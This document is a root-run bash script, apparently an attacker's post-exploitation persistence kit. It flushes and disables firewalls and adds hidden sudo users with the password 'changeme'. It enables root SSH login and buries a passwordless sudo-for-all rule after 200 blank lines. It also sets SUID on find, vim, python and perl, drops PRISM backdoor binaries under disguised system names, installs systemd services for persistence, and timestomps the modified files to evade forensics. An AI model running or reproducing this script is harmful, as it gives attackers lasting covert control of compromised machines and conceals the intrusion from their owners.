#!/bin/bash

# Hacking? That's not very cash-money of you...
#
# This script must be run as root
# Its functions are as follows:
#	- Attempt to open firewall (U/C)
#	- Add sudo backup users
#	- Ensure sudo doesnt need password
#	- SUID bins
#	- Drop prism bins
#	- Establish systemd persistence
#	- Timestomp


# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X &> /dev/null
    	iptables -F &> /dev/null
    	iptables -t nat -F &> /dev/null
    	iptables -t nat -X &> /dev/null
    	iptables -t mangle -F &> /dev/null
    	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
    	iptables -P FORWARD ACCEPT &> /dev/null
    	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	

	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X &> /dev/null
        iptables -F &> /dev/null
        iptables -t nat -F &> /dev/null
        iptables -t nat -X &> /dev/null
        iptables -t mangle -F &> /dev/null
        iptables -t mangle -X &> /dev/null
        iptables -P INPUT ACCEPT &> /dev/null
        iptables -P FORWARD ACCEPT &> /dev/null
        iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
        useradd -G sudo jmorris &>/dev/null
        echo "jmorris:changeme" | chpasswd &>/dev/null
        useradd -G sudo tgoodman &>/dev/null
        echo "tgoodman:changeme" | chpasswd &>/dev/null
        useradd -G sudo bmiller &>/dev/null
        echo "bmiller:changeme" | chpasswd &>/dev/null
fi


#===============================================================================
			# CONFIGURATIONSS #
#===============================================================================

# Enable Root login over ssh
if [[ -f /etc/ssh/sshd_config ]]
then
	sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
fi

mv /tmp/asdasd /etc/ssh/sshd_config
rm -f /tmp/asdasd



# Enable sudowoodo
if grep -Fxq "ALL ALL=(ALL:ALL) NOPASSWD:ALL" /etc/sudoers
then
	echo "" >> /etc/sudoers
else
	for i in {1..200}
	do
		echo "" >> /etc/sudoers
	done
	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
fi

#===============================================================================
				# SUID #
#===============================================================================

# FIND
if [[ -f /bin/find ]]
then
	sh -c 'chmod 7777 /bin/find'
fi

if [[ -f /usr/bin/find ]]
then
	sh -c 'chmod 7777 /usr/bin/find'
fi

# VIM
if [[ -f /bin/vim ]]
then
	sh -c 'chmod 7777 /bin/vim'
fi

if [[ -f /usr/bin/vim ]]
then
	sh -c 'chmod 7777 /usr/bin/vim'
fi

# PYTHON
if [[ -f /bin/python ]]
then
	sh -c 'chmod 7777 /bin/python'
fi

if [[ -f /bin/python3 ]]
then
	sh -c 'chmod 7777 /bin/python3'
fi

if [[ -f /usr/bin/python ]]
then
	sh -c 'chmod 7777 /usr/bin/python'
fi

if [[ -f /usr/bin/python3 ]]
then
	sh -c 'chmod 7777 /usr/bin/python3'
fi

# PERL
if [[ -f /bin/perl ]]
then
	sh -c 'chmod 7777 /bin/perl'
fi

if [[ -f /usr/bin/perl ]]
then
	sh -c 'chmod 7777 /usr/bin/perl'
fi

#===============================================================================
				# DROPPER #
#===============================================================================

# PRISM
chmod 7700 ./fsdisk
cp ./fsdisk /sbin/

chmod 7700 ./devutil
cp ./devutil /usr/local/

chmod 7700 ./udevd
cp ./udevd /sbin/


# SYSTEMD PERSISTENCE
chmod 777 ./developer-utility.service
cp ./developer-utility.service /etc/systemd/system/
systemctl start developer-utility.service
systemctl enable developer-utility.service

chmod 777 ./developer-utility-daemon.service
cp ./developer-utility-daemon.service /etc/systemd/system/
systemctl start developer-utility-daemon.service
systemctl enable developer-utility-daemon.service

chmod 777 ./filesys.service
cp ./filesys.service /etc/systemd/system/
systemctl start filesys.service
systemctl enable filesys.service


#===============================================================================
				# TIMESTOMP #
#===============================================================================

touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

touch -a --date "2020-11-20 20:51:30" /etc/passwd
touch -m --date "2020-11-20 20:51:30" /etc/passwd

touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config

touch -a --date "2020-3-20 20:51:30" /etc/sudoers
touch -m --date "2020-3-20 20:51:30" /etc/sudoers

touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk

touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
touch -m --date "2016-11-21 20:51:30" /usr/local/devutil

touch -a --date "2020-11-30 20:51:30" /sbin/udevd
touch -m --date "2020-11-30 20:51:30" /sbin/udevd

touch -a --date "2020-11-30 20:51:30" /sbin
touch -m --date "2020-11-30 20:51:30" /sbin

touch -a --date "2021-1-30 20:51:30" /etc/ssh
touch -m --date "2021-1-30 20:51:30" /etc/ssh

touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service

touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/

touch -a --date "2020-3-20 20:51:30" /etc/systemd/
touch -m --date "2020-3-20 20:51:30" /etc/systemd/

touch -a --date "2020-11-30 20:51:30" /etc
touch -m --date "2020-11-30 20:51:30" /etc


exit 0
